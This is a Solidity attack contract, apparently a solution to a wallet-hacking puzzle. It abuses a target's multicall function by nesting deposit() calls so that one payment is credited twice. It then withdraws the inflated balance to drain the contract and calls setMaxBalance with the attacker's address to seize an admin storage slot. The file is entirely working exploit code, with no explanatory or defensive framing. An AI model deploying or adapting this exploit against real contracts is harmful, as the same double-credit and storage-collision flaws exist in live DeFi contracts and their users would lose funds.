pragma solidity ^0.8.0;

contract ExploitPuzzle {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function exploit() external payable {
        // Prepare deposit() calldata
        bytes memory depositData = abi.encodeWithSignature("deposit()");
        
        // Prepare inner multicall with one deposit
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = depositData;
        bytes memory innerMulticall = abi.encodeWithSignature("multicall(bytes[])", innerData);
        
        // Prepare outer multicall with deposit and inner multicall
        bytes[] memory outerData = new bytes[](2);
        outerData[0] = depositData;
        outerData[1] = innerMulticall;
        
        // Call multicall with nested calls - this deposits 0.001 ETH but credits us 0.002 ETH
        (bool success,) = target.call{value: msg.value}(
            abi.encodeWithSignature("multicall(bytes[])", outerData)
        );
        require(success, "Multicall failed");
        
        // Now drain the contract by executing 0.002 ETH withdrawal
        (success,) = target.call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", msg.sender, 0.002 ether, "")
        );
        require(success, "Execute failed");
        
        // Finally set maxBalance to our address
        (success,) = target.call(
            abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(msg.sender)))
        );
        require(success, "SetMaxBalance failed");
    }
}